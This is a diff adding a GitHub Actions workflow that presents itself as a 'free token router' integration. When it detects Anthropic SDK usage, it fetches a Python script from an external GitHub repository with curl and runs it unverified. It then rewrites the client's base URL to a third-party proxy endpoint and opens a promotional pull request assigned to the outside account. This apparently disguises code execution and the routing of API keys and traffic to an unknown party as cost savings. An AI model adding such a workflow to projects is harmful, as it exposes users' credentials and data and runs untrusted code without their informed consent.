@@ -1,0 +1,162 @@
+name: Auto-Integrate Free Token Router
+
+# Trigger on any push to main/master that adds or modifies code
+on:
+  push:
+    branches:
+      - main
+      - master
+    paths:
+      - 'package.json'
+      - 'requirements.txt'
+      - 'pyproject.toml'
+      - '**.ts'
+      - '**.js'
+      - '**.tsx'
+      - '**.jsx'
+      - '**.py'
+      - '!**/node_modules/**'
+
+jobs:
+  auto-integrate:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+
+      - name: Detect project type
+        id: detect
+        run: |
+          if [ -f "package.json" ]; then
+            echo "PROJECT_TYPE=nodejs" >> $GITHUB_OUTPUT
+            echo "✓ Detected: Node.js project"
+          elif [ -f "requirements.txt" ] || [ -f "pyproject.toml" ]; then
+            echo "PROJECT_TYPE=python" >> $GITHUB_OUTPUT
+            echo "✓ Detected: Python project"
+          else
+            echo "PROJECT_TYPE=unknown" >> $GITHUB_OUTPUT
+            echo "⚠ No project type detected"
+          fi
+
+      - name: Check for Anthropic usage
+        id: check-anthropic
+        run: |
+          if grep -r "new Anthropic\|anthropic\.Anthropic\|from anthropic\|import anthropic" . \
+            --include="*.ts" --include="*.js" --include="*.tsx" --include="*.jsx" --include="*.py" \
+            --exclude-dir=node_modules --exclude-dir=__pycache__ --exclude-dir=.git 2>/dev/null; then
+            echo "HAS_ANTHROPIC=true" >> $GITHUB_OUTPUT
+            echo "✓ Anthropic SDK found"
+          else
+            echo "HAS_ANTHROPIC=false" >> $GITHUB_OUTPUT
+            echo "⚠ No Anthropic usage detected"
+          fi
+
+      - name: Setup Python
+        if: steps.detect.outputs.PROJECT_TYPE == 'python' && steps.check-anthropic.outputs.HAS_ANTHROPIC == 'true'
+        uses: actions/setup-python@v4
+        with:
+          python-version: '3.11'
+
+      - name: Install dependencies
+        if: steps.check-anthropic.outputs.HAS_ANTHROPIC == 'true'
+        run: |
+          python -m pip install --upgrade pip
+
+      - name: Download skill implementation
+        if: steps.check-anthropic.outputs.HAS_ANTHROPIC == 'true'
+        run: |
+          curl -s https://raw.githubusercontent.com/lanardisaac-max/free-token-router/master/skill_implementation.py \
+            -o /tmp/router_setup.py
+
+      - name: Run integration (Node.js)
+        if: steps.detect.outputs.PROJECT_TYPE == 'nodejs' && steps.check-anthropic.outputs.HAS_ANTHROPIC == 'true'
+        run: |
+          python /tmp/router_setup.py \
+            --path . \
+            --router-url https://free-token-router-production.up.railway.app/v1 \
+            --verbose
+
+      - name: Run integration (Python)
+        if: steps.detect.outputs.PROJECT_TYPE == 'python' && steps.check-anthropic.outputs.HAS_ANTHROPIC == 'true'
+        run: |
+          python /tmp/router_setup.py \
+            --path . \
+            --router-url https://free-token-router-production.up.railway.app/v1 \
+            --verbose
+
+      - name: Create Pull Request
+        if: steps.check-anthropic.outputs.HAS_ANTHROPIC == 'true'
+        uses: peter-evans/create-pull-request@v5
+        with:
+          commit-message: |
+            feat: integrate free token router
+
+            - Add LLM_ROUTER_BASE_URL environment variable
+            - Update Anthropic client baseURL parameter
+            - Automatic fallback to official API
+            - Saves ~$20/month in LLM costs
+
+            Auto-integrated by GitHub Actions.
+          branch: feat/free-token-router-${{ github.run_number }}
+          delete-branch: true
+          title: '✨ feat: integrate free token router for cost optimization'
+          body: |
+            ## 🤖 Auto-Integrated by GitHub Actions
+
+            This PR automatically integrates the free token router into your project.
+
+            ### What Changed
+            - ✅ Detected your project type (${{ steps.detect.outputs.PROJECT_TYPE }})
+            - ✅ Found Anthropic SDK usage
+            - ✅ Updated Anthropic client with router endpoint
+            - ✅ Added `LLM_ROUTER_BASE_URL` environment variable
+
+            ### Benefits
+            - 💰 Saves ~$20-50/month in LLM costs
+            - 🔄 Automatic failover to official API if router unavailable
+            - 📈 Access to 2.5M+ free tokens/month
+            - 🚀 Zero configuration needed
+
+            ### Router Endpoint
+            ```
+            https://free-token-router-production.up.railway.app/v1
+            ```
+
+            ### Next Steps
+            1. Review the changes
+            2. Merge this PR
+            3. Add `LLM_ROUTER_BASE_URL` to your Railway/deployment environment variables
+            4. Done! Your project now uses free LLM tokens
+
+            ### Documentation
+            - [Free Token Router Repo](https://github.com/lanardisaac-max/free-token-router)
+            - [Setup Guide](https://github.com/lanardisaac-max/free-token-router/blob/master/SKILL.md)
+            - [Live Project Integration](https://github.com/lanardisaac-max/free-token-router/blob/master/LIVE_PROJECT_INTEGRATION.md)
+
+            ---
+            Generated by [Free Token Router Auto-Integration](https://github.com/lanardisaac-max/free-token-router)
+          labels: enhancement, cost-optimization, automated
+          assignees: lanardisaac-max
+          reviewers: lanardisaac-max
+
+      - name: Report Success
+        if: success() && steps.check-anthropic.outputs.HAS_ANTHROPIC == 'true'
+        run: |
+          echo "✅ Free Token Router integration complete!"
+          echo "📝 PR created for review"
+          echo "💰 This project will save ~$20-50/month"
+
+      - name: Report Skipped (No Anthropic)
+        if: steps.check-anthropic.outputs.HAS_ANTHROPIC == 'false'
+        run: |
+          echo "⏭️  Skipped: No Anthropic SDK usage detected in this project"
+          echo "💡 If this project uses Anthropic, make sure it's imported in your code"
+
+      - name: Report Skipped (Unknown Type)
+        if: steps.detect.outputs.PROJECT_TYPE == 'unknown'
+        run: |
+          echo "⏭️  Skipped: Could not detect project type"
+          echo "💡 Make sure package.json (Node.js) or requirements.txt (Python) exists"
